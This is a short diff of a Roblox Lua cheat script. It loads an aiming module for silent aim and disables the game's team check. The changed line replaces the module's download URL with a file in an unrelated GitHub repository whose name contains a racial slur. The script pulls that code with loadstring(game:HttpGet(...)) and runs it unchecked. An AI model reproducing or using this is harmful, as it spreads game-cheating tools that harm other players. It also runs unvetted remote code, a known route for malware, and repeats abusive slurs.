@@ -5,7 +5,7 @@
 ]]
 
 -- // Dependencies
-local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/Stefanuk12/ROBLOX/master/Universal/Aiming/Module.lua"))()
+local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/GhoulsLegit/moneymaketutariotl/main/Niggasilentaim123"))()
 
 -- // Disable Team Check
 Aiming.TeamCheck(false)
